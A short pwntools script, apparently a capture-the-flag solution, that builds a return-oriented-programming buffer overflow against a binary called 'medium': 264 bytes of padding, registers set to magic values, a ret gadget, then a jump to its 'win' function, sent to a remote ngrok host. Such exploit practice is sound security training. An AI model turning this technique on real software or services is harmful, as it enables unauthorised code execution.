from pwn import *
exe = context.binary = ELF("./medium")
# r = process()
r = remote("0.tcp.ap.ngrok.io", 16374)
# sleep(10)
rop = ROP(exe)
rop.raw(b"A" * 264)
rop.rdi = 0xdeadbeef
rop.rsi = 0xfacebeeb
rop.rdx = 0xdeadface
rop.raw(0x000000000040101a)
rop.raw(exe.sym['win'])
r.sendline(rop.chain())
r.interactive() 